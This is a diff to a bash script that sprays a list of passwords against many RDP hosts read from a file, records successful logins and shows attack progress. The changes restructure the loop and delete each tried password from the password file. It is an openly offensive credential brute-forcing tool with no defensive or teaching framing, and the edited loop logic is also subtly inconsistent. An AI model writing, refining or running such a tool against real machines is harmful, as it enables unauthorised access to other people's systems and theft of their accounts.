@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Define the input files
+# Define input files
 iplog_file="iplog.txt"
 passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
@@ -18,10 +18,9 @@ fi
 
 # Read all RDP entries into an array, filter out empty lines
 mapfile -t iplog_entries < <(grep -v '^$' "$iplog_file")
-# Read all passwords into an array, filter out empty lines
-mapfile -t passwords < <(grep -v '^$' "$passwords_file")
 
 # Initialize variables
+total_passwords=$(wc -l < "$passwords_file")
 current_attempt=0
 successful_attempts=0
 start_time=$(date +%s)
@@ -30,19 +29,18 @@ start_time=$(date +%s)
 display_progress() {
     local elapsed_time=$1
     local current_attempt=$2
-    local total_attempts=$3
-    local successful_attempts=$4
-    local current_password=$5
+    local successful_attempts=$3
+    local current_password=$4
 
-    local percent=$(( (current_attempt * 100) / total_attempts ))
-    local estimated_time_left=$(( (elapsed_time * total_attempts / current_attempt) - elapsed_time ))
+    local percent=$(( (current_attempt * 100) / (total_passwords * ${#iplog_entries[@]})))
+    local estimated_time_left=$(( (elapsed_time * (total_passwords * ${#iplog_entries[@]})) / current_attempt - elapsed_time ))
 
     # Calculate attempts per minute
     local attempts_per_minute=$(( current_attempt * 60 / elapsed_time ))
 
     tput clear
-    echo "Total Attempts: $total_attempts"
-    echo "Progress: $current_attempt / $total_attempts ($percent%)"
+    echo "Total Attempts: $((total_passwords * ${#iplog_entries[@]}))"
+    echo "Progress: $current_attempt / $((total_passwords * ${#iplog_entries[@]})) ($percent%)"
     echo "Currently checking password: '$current_password'"
     echo "Successful logins: $successful_attempts"
     echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
@@ -56,12 +54,15 @@ display_progress() {
 # Print initial UI
 echo "Attempting logins..."
 
+# Read passwords into an array, filter out empty lines
+mapfile -t passwords < <(grep -v '^$' "$passwords_file")
+
 # Loop through each password
 for password in "${passwords[@]}"; do
     # Ensure the password is not empty
     if [[ -z "$password" ]]; then continue; fi
 
-    # Loop through each entry in iplog.txt
+    # Check all hosts for the current password
     for entry in "${iplog_entries[@]}"; do
         IFS="://" read -r protocol full_url <<< "$entry"
         IFS=":" read -r rdp_ip target_name <<< "$full_url"
@@ -84,11 +85,13 @@ for password in "${passwords[@]}"; do
         elapsed_time=$(( $(date +%s) - start_time ))
 
         # Display progress
-        display_progress "$elapsed_time" "$current_attempt" "$((${#iplog_entries[@]} * 1))" "$successful_attempts" "$password"
+        display_progress "$elapsed_time" "$current_attempt" "$successful_attempts" "$password"
     done
 
-    # Remove the password from the list after checking
-    passwords=("${passwords[@]:1}")  # Remove the first element (the checked password)
+    # Remove the password from passwords.txt by creating a new file without the used password
+    sed -i "1d" "$passwords_file"  # Delete the first line (the used password)
+    # Re-read passwords into the array after modification
+    mapfile -t passwords < <(grep -v '^$' "$passwords_file")
 done
 
 # Final output
